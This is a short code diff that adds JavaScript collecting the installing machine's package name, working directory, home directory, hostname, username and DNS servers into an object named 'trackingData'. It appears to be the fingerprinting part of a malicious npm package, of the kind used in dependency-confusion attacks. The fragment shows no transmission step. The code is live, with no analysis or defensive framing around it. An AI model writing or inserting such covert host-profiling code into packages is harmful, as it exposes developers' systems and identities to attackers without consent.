@@ -1,0 +1,9 @@
+const trackingData = JSON.stringify({
+    pkg: "npm/" + packageJSON.name,
+    pwd: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+})
+_tmp_3.hd = os.homedir()
